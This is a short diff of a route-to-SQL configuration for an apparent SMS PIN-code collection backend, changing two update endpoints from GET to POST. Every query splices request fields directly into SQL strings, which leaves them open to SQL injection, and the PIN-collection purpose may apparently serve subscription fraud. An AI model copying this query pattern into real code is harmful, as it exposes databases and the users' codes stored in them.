@@ -88,9 +88,9 @@ POST /api/pins/getIde:
 POST /api/pin/getIde:
   INSERT INTO pinCodeCollect (appId,offerId,userId,requestId,pinInject,message,uploadTime) VALUES (${data.appId},${data.offerId},${data.userId},${data.requestId},${data.pinInject},${data.message},${data.uploadTime});
 #短信更新
-GET /api/pinInjects/getIde:
+POST /api/pinInjects/getIde:
   update pinCodeCollects set pinInject=${data.pinInject} WHERE requestId = ${data.requestId};
-GET /api/pinInject/getIde:
+POST /api/pinInject/getIde:
   update pinCodeCollect set pinInject=${data.pinInject} WHERE requestId = ${data.requestId};
 #短信搜索
 GET /api/pinInject/getMassages:
